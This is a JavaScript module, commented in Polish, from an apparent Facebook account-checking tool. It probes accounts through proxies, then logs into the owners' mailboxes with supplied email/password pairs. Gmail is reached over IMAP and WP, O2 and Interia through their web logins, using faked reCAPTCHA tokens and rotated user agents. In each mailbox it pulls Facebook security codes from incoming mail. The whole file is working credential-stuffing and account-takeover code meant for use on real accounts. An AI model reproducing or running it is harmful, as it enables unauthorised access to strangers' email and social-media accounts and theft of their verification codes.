import { chromium } from 'playwright';
import { writeFileSync, mkdirSync } from 'node:fs';
import { randomBytes, createHash } from 'node:crypto';
import { httpProbe, wwwRecoveryProbe } from './httpProbe.js';
import imaps from 'imap-simple';
import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import * as tough from 'tough-cookie';

const ROUTE_DEBUG_DIR = '/tmp/fb_route_debug';
try { mkdirSync(ROUTE_DEBUG_DIR, { recursive: true }); } catch {}

function safeName(s) { return String(s || 'unknown').replace(/[^a-zA-Z0-9._@-]+/g, '_').slice(0, 80); }

let _browser = null;
let _browserPromise = null;

const DESKTOP_UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
];

const VIEWPORTS = [
  { width: 1366, height: 768 },
  { width: 1440, height: 900 },
  { width: 1536, height: 864 },
  { width: 1920, height: 1080 },
];

const pick = (a) => a[Math.floor(Math.random() * a.length)];

function randomString(length = 16) {
  return Array.from({ length }, () => Math.floor(Math.random() * 36).toString(36)).join('');
}
function randomFrontTraceId() {
  return `${randomString(10)}${randomString(10)}`;
}
function randomRecaptchaToken() {
  return `0.${randomString(80)}`;
}
function normalizeLocation(loc, base = 'https://poczta.wp.pl') {
  if (!loc) return '';
  return /^https?:\/\//i.test(loc) ? loc : new URL(loc, base).toString();
}
function isBadLoginRedirect(loc) {
  return /#bad_login|bad_login/i.test(loc);
}
function isAuthRedirect(loc) {
  return /1login\.wp\.pl\/api\/v1\/public\/ol-authprovider\/auth|ol-authprovider\/auth|ol-identity-provider\/login|\/zaloguj\?client_id=poczta_nh/i.test(loc);
}

function isMailboxLoginSupported(email) {
  const lower = String(email || '').toLowerCase();
  return lower.includes('@wp.pl') || lower.includes('@o2.pl') || lower.includes('@gmail.com') || INTERIA_DOMAINS.some(d => lower.endsWith(d));
}

async function followBadLoginRedirects(client, url, headers) {
  let current = url;
  for (let i = 0; i < 8; i++) {
    const response = await client.get(current, {
      headers,
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });
    const nextLocation = normalizeLocation(response.headers?.location, current);
    if (nextLocation) {
      if (isBadLoginRedirect(nextLocation)) throw new Error('Bad login');
      current = nextLocation;
      continue;
    }
    const body = String(response.data || '');
    if (/#bad_login/i.test(body) || /Nieprawidłowy adres e-mail lub hasło/i.test(body) || /Invalid email or password/i.test(body)) {
      throw new Error('Bad login');
    }
    break;
  }
}

// Wszystkie domeny należące do grupy Interia (logowanie przez auth.interia.pl)
const INTERIA_DOMAINS = [
  '@interia.pl', '@interia.eu', '@intmail.pl', '@adresik.net',
  '@vip.interia.pl', '@ogarnij.se', '@poczta.fm', '@interia.com',
  '@interiowy.pl', '@pisz.to', '@pacz.to',
];

export async function getVerificationCode(email, password, timeout = 30000) {
  const lower = String(email || '').toLowerCase();
  if (lower.includes('@wp.pl')) {
    return await getVerificationCodeWP(email, password, timeout);
  }
  if (lower.includes('@o2.pl')) {
    return await getVerificationCodeO2(email, password, timeout);
  }
  if (INTERIA_DOMAINS.some(d => lower.endsWith(d))) {
    return await getVerificationCodeInteria(email, password, timeout);
  }
  if (lower.includes('@gmail.com')) {
    console.time('Gmail Code Retrieval');
    // istniejący kod IMAP dla Gmail
    let imapConfig = {
      user: email,
      password: password,
      host: 'imap.gmail.com',
      port: 993,
      tls: true,
      authTimeout: 3000
    };
    try {
      const connection = await imaps.connect({ imap: imapConfig });
      await connection.openBox('INBOX');
      const searchCriteria = ['UNSEEN', ['SINCE', new Date(Date.now() - 60000)]];
      const fetchOptions = { bodies: ['HEADER.FIELDS (FROM SUBJECT)', 'TEXT'], markSeen: false };
      const messages = await connection.search(searchCriteria, fetchOptions);
      for (const msg of messages.reverse()) {
        const header = msg.parts.find(p => p.which === 'HEADER.FIELDS (FROM SUBJECT)');
        const from = header.body.from[0];
        const subject = header.body.subject[0];
        if (/facebook|meta/i.test(from) && /code|verification|kod/i.test(subject)) {
          const bodyPart = msg.parts.find(p => p.which === 'TEXT');
          const body = bodyPart.body;
          const codeMatch = body.match(/\b\d{6}\b/);
          if (codeMatch) {
            console.log(`Gmail Code retrieved: ${codeMatch[0]} for ${email}`);
            connection.end();
            return codeMatch[0];
          }
        }
      }
      console.timeEnd('Gmail Code Retrieval');
      connection.end();
      return null;
    } catch (e) {
      console.timeEnd('Gmail Code Retrieval');
      throw e;
    }
  }
  return null;
}

async function getVerificationCodeWP(email, password, timeout) {
  console.time('WP Code Retrieval');
  const jar = new tough.CookieJar();
  const client = wrapper(axios.create({ jar, maxRedirects: 5, timeout: Math.min(timeout, 15000) }));

  try {
    // Frontend events
    await client.post('https://poczta.wp.pl/api/v1/public/frontend-events/send', {
      event_type: "LOGIN_AUTOFILL",
      data: {
        login: true,
        password: false,
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        mobile: false
      }
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    // Krok 1: Preauth (logowanie)
    const ua = pick(DESKTOP_UAS);
    const preauthData = `login_username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&X_Recaptcha-SiteKey=0x4AAAAAAAgDH9Sb8eciAsxA&frontTraceId=${encodeURIComponent(randomFrontTraceId())}&X-Recaptcha=${encodeURIComponent(randomRecaptchaToken())}`;
    const preauthResponse = await client.post('https://poczta.wp.pl/login/v1/sso/preauth', preauthData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'User-Agent': ua,
        'Origin': 'https://poczta.wp.pl',
        'Referer': 'https://poczta.wp.pl/login/login.html'
      },
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });

    const location = normalizeLocation(preauthResponse.headers?.location);
    if (preauthResponse.status === 303 || isBadLoginRedirect(location)) {
      throw new Error('Bad login');
    }
    if (![302, 303].includes(preauthResponse.status) && preauthResponse.status !== 200) {
      throw new Error(`Unexpected status in preauth: ${preauthResponse.status}`);
    }

    if (location) {
      if (isAuthRedirect(location)) {
        await followBadLoginRedirects(client, location, {
          'User-Agent': ua,
          'Referer': 'https://poczta.wp.pl/login/login.html'
        });
      } else if (/login\.html\?zaloguj=poczta#bad_login/i.test(location) || isBadLoginRedirect(location)) {
        throw new Error('Bad login');
      }
    }

    // Krok 3: Wyszukaj wiadomości
    const searchPayload = {
      searchText: 'security@facebookmail.com OR security@meta.com OR security@fb.com',
      filters: [],
      count: 40,
      marker: '',
      segregatorMode: 'simplified',
      opts: {}
    };

    const searchResponse = await client.post('https://poczta.wp.pl/api/v2/search-finder/advanced', searchPayload, {
      headers: {
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'Referer': 'https://poczta.wp.pl/w/mails?folder=simplified.main'
      }
    });

    if (searchResponse.status !== 200) {
      throw new Error('Search failed');
    }

    const mails = searchResponse.data?.data || searchResponse.data?.mails || searchResponse.data || [];
    const sorted = Array.isArray(mails) ? [...mails].sort((a, b) => (b.incomingDate || 0) - (a.incomingDate || 0)) : [];
    for (const mail of sorted) {
      const address = String(mail.address || '');
      const subject = String(mail.subject || '');
      if (!/security@(facebookmail\.com|meta\.com|fb\.com)/i.test(address)) continue;
      const codeMatch = subject.match(/\b(\d{6,8})\b/);
      if (codeMatch) {
        console.log(`WP Code retrieved: ${codeMatch[1]} for ${email}`);
        return codeMatch[1];
      }
    }
    return null;
  } catch (e) {
    if (String(e?.message || '').toLowerCase().includes('bad login')) throw e;
    return null;
  } finally {
    console.timeEnd('WP Code Retrieval');
  }
}

async function getVerificationCodeO2(email, password, timeout) {
  console.time('O2 Code Retrieval');
  const jar = new tough.CookieJar();
  const client = wrapper(axios.create({ jar, maxRedirects: 5, timeout: Math.min(timeout, 15000) }));

  try {
    // Frontend events
    await client.post('https://poczta.o2.pl/api/v1/public/frontend-events/send', {
      event_type: "LOGIN_AUTOFILL",
      data: {
        login: true,
        password: false,
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        mobile: false
      }
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    // Krok 1: Preauth (logowanie)
    const ua = pick(DESKTOP_UAS);
    const preauthData = `login_username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&X_Recaptcha-SiteKey=0x4AAAAAAAgDH9Sb8eciAsxA&frontTraceId=${encodeURIComponent(randomFrontTraceId())}&X-Recaptcha=${encodeURIComponent(randomRecaptchaToken())}`;
    const preauthResponse = await client.post('https://poczta.o2.pl/login/v1/sso/preauth', preauthData, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'User-Agent': ua,
        'Origin': 'https://poczta.o2.pl',
        'Referer': 'https://poczta.o2.pl/login/login.html'
      },
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });

    const location = normalizeLocation(preauthResponse.headers?.location, 'https://poczta.o2.pl');
    if (preauthResponse.status === 303 || isBadLoginRedirect(location)) {
      throw new Error('Bad login');
    }
    if (![302, 303].includes(preauthResponse.status) && preauthResponse.status !== 200) {
      throw new Error(`Unexpected status in preauth: ${preauthResponse.status}`);
    }

    if (location) {
      if (isAuthRedirect(location)) {
        await followBadLoginRedirects(client, location, {
          'User-Agent': ua,
          'Referer': 'https://poczta.o2.pl/login/login.html'
        });
      } else if (/login\.html\?zaloguj=poczta#bad_login/i.test(location) || isBadLoginRedirect(location)) {
        throw new Error('Bad login');
      }
    }

    // Krok 3: Wyszukaj wiadomości
    const searchPayload = {
      searchText: 'security@facebookmail.com OR security@meta.com OR security@fb.com',
      filters: [],
      count: 40,
      marker: '',
      segregatorMode: 'simplified',
      opts: {}
    };

    const searchResponse = await client.post('https://poczta.o2.pl/api/v2/search-finder/advanced', searchPayload, {
      headers: {
        'Content-Type': 'application/json;charset=UTF-8',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'Referer': 'https://poczta.o2.pl/w/mails?folder=simplified.main'
      }
    });

    if (searchResponse.status !== 200) {
      throw new Error('Search failed');
    }

    const mails = searchResponse.data?.data || searchResponse.data?.mails || searchResponse.data || [];
    const sorted = Array.isArray(mails) ? [...mails].sort((a, b) => (b.incomingDate || 0) - (a.incomingDate || 0)) : [];
    for (const mail of sorted) {
      const address = String(mail.address || '');
      const subject = String(mail.subject || '');
      if (!/security@(facebookmail\.com|meta\.com|fb\.com)/i.test(address)) continue;
      const codeMatch = subject.match(/\b(\d{6,8})\b/);
      if (codeMatch) {
        console.log(`O2 Code retrieved: ${codeMatch[1]} for ${email}`);
        return codeMatch[1];
      }
    }
    return null;
  } catch (e) {
    if (String(e?.message || '').toLowerCase().includes('bad login')) throw e;
    return null;
  } finally {
    console.timeEnd('O2 Code Retrieval');
  }
}

async function getVerificationCodeInteria(email, password, timeout) {
  const effectiveTimeout = Math.min(timeout, 20000);
  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0';

  const jar = new tough.CookieJar();
  const client = wrapper(axios.create({
    jar,
    maxRedirects: 0,
    validateStatus: () => true,
    timeout: effectiveTimeout,
    decompress: true,
  }));

  try {
    // Generuj PKCE S256: losowy verifier → SHA256 → base64url = code_challenge
    const verifier = randomBytes(32).toString('base64url');
    const challenge = createHash('sha256').update(verifier).digest('base64url');

    // Generuj losowy deviceUuid (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
    const h4 = () => randomBytes(2).toString('hex');
    const deviceUuid = [
      randomBytes(4).toString('hex'),
      h4(), h4(), h4(),
      randomBytes(6).toString('hex'),
    ].join('-');

    // Krok 1: POST https://auth.interia.pl/auth
    const authBody = new URLSearchParams({
      email,
      password,
      captchaRes: '[object Object]',
      client_id: '8efab5b8fe052033a91adaf38ca5b4c0',
      code_challenge_method: 'S256',
      code_challenge: challenge,
      grant_type: 'password',
      response_type: 'code',
      scope: 'email basic login',
      redirect_uri: 'https://poczta.interia.pl/logowanie/sso/login',
      deviceUuid,
      crc: '',
      referer: '',
      failedLogginAttempt: '0',
    });

    const authRes = await client.post('https://auth.interia.pl/auth', authBody.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': UA,
        'Origin': 'https://poczta.interia.pl',
        'Referer': 'https://poczta.interia.pl/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'pl,en-US;q=0.9,en;q=0.8',
        'Upgrade-Insecure-Requests': '1',
      },
    });

    const loc1 = authRes.headers['location'] || '';

    // Błędne logowanie: invalid_credentials → b=-4, access_denied → b=11
    if (!loc1 || loc1.includes('error=invalid_credentials') || loc1.includes('b=-4')) return null;
    if (loc1.includes('error=access_denied') || loc1.includes('b=11')) return null;
    if (!loc1.includes('logowanie/sso/login?code=')) return null;

    // Krok 2: GET logowanie/sso/login?code=... → ustawia SID/ESID/UEMAIL + redirect do /next/?uid=
    const ssoUrl = loc1.startsWith('http') ? loc1 : 'https://poczta.interia.pl' + loc1;
    const ssoRes = await client.get(ssoUrl, {
      headers: {
        'User-Agent': UA,
        'Referer': 'https://poczta.interia.pl/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'pl,en-US;q=0.9,en;q=0.8',
        'Upgrade-Insecure-Requests': '1',
      },
    });

    const loc2 = ssoRes.headers['location'] || '';
    const uidMatch = loc2.match(/\/next\/\?uid=([a-f0-9]+)/i);
    if (!uidMatch) return null;
    const uid = uidMatch[1]; // uid === x-xsrf-token dla API skrzynki

    // Krok 3: GET /next/?uid= → finalizuje sesję (ustawia ostatnie cookies)
    const nextUrl = loc2.startsWith('http') ? loc2 : 'https://poczta.interia.pl' + loc2;
    await client.get(nextUrl, {
      headers: {
        'User-Agent': UA,
        'Referer': 'https://poczta.interia.pl/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Upgrade-Insecure-Requests': '1',
      },
    });

    // Krok 4: Szukaj wiadomości od facebookmail.com w folderze -101 (szukaj wszystkich folderów)
    const cacheTime = Date.now();
    const mailsRes = await client.post(
      `https://poczta.interia.pl/next/folder/-101/mails?cacheTime=${cacheTime}&page=1&ver=2`,
      { from: 'facebookmail.com', isSearch: true },
      {
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json',
          'x-xsrf-token': uid,
          'x-requested-with': 'XMLHttpRequest',
          'x-cache-is-valid': 'true',
          'User-Agent': UA,
          'Origin': 'https://poczta.interia.pl',
          'Referer': 'https://poczta.interia.pl/',
          'Accept-Language': 'pl,en-US;q=0.9,en;q=0.8',
        },
      }
    );

    if (mailsRes.status !== 200 || !mailsRes.data?.data?.messages) return null;

    const messages = mailsRes.data.data.messages;
    // Format subject Interia: "96489 to Twój kod potwierdzający" — kod jest NA POCZĄTKU tematu
    for (const msg of messages) {
      const subject = String(msg.subject || '');
      const fromEmail = String(msg.fromEmail || '');
      if (!fromEmail.includes('facebookmail.com')) continue;
      const codeMatch = subject.match(/^(\d{5,8})\b/);
      if (codeMatch) return codeMatch[1];
    }

    return null;
  } catch (_e) {
    throw _e;
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// probeAccount(email, proxyUrl, opts)
// Wrapper na httpProbe(): mapuje wewnętrzne `decision` na `status` używany
// przez checkt.js i uzupełnia pola wymagane przez formatHitLine/categorise.
// Opcjonalnie próbuje pobrać kod weryfikacyjny ze skrzynki gdy podano hasło
// i konto wygląda na pełnoaktywne (active='yes', emailFound).
// ─────────────────────────────────────────────────────────────────────────────
export async function probeAccount(email, proxyUrl, opts = {}) {
  const password = opts.password || '';
  const timeout = opts.timeout ?? 45000;
  const session = opts.session;

  const base = {
    email, password,
    status: 'error', detail: '',
    code: '-', channel: '-',
    emails: [], phones: [],
    emailFound: false,
    active: 'no',
    recoverUrl: '',
    loggedIn: false,
    mailValid: false,
  };

  let r;
  try {
    r = await httpProbe(email, proxyUrl, { timeout, session });
  } catch (e) {
    return { ...base, status: 'retry', detail: `httpProbe:${String(e?.message || e).slice(0, 80)}` };
  }

  // Mapowanie decision → status używany przez Master/categorise
  const decisionMap = {
    'exists':              'active',
    'not_found':           'not_found',
    'rate_limited':        'rate_limited',
    'transport_error':     'retry',
    'bad_email_recovery':  'bad',
    'ambiguous':           'retry',
  };
  const status = decisionMap[r.decision] || 'failed';

  const out = {
    ...base,
    status,
    detail: r.detail || '',
    code: r.codeLen ? String(r.codeLen) : '-',
    emails: Array.isArray(r.emails) ? r.emails : [],
    phones: Array.isArray(r.phones) ? r.phones : [],
    emailFound: !!r.emailFound || (Array.isArray(r.emails) && r.emails.some(m => String(m || '').toLowerCase() === String(email || '').toLowerCase())),
    active: r.active || 'no',
    recoverUrl: r.redirectUri || '',
  };

  let mailValid = false;
  if (status === 'not_found' && password && isMailboxLoginSupported(email)) {
    try {
      await getVerificationCode(email, password, Math.min(timeout, 12000));
      mailValid = true;
      out.status = 'failed';
      out.detail = (out.detail ? out.detail + '|' : '') + 'mail:valid';
    } catch (e) {
      mailValid = false;
    }
  }
  out.mailValid = mailValid;

  // Opcjonalna próba odebrania kodu z poczty (gdy aktywne + emailFound + jest hasło)
  if (
    status === 'active' &&
    out.emailFound &&
    out.active === 'yes' &&
    password &&
    (out.code === '6' || out.code === '8')
  ) {
    try {
      const code = await getVerificationCode(email, password, Math.min(timeout, 25000));
      if (code) {
        out.loggedIn = true;
        out.detail = (out.detail ? out.detail + '|' : '') + `mailcode:${code}`;
        out.code = String(code.length);
      }
    } catch (e) {
      const msg = String(e?.message || '').toLowerCase();
      if (msg.includes('bad login') || msg.includes('bad_login')) {
        out.status = 'bad';
        out.detail = (out.detail ? out.detail + '|' : '') + 'mail:bad_login';
      }
    }
  }

  return out;
}

export async function getBrowser() {
  if (_browser) return _browser;
  if (_browserPromise) return _browserPromise;
  _browserPromise = chromium.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--disable-dev-shm-usage',
      '--disable-gpu',
    ],
  }).then(b => { _browser = b; return b; });
  return _browserPromise;
}

export async function closeBrowser() {
  if (_browser) {
    try { await _browser.close(); } catch { /* ignore */ }
    _browser = null;
    _browserPromise = null;
  }
}
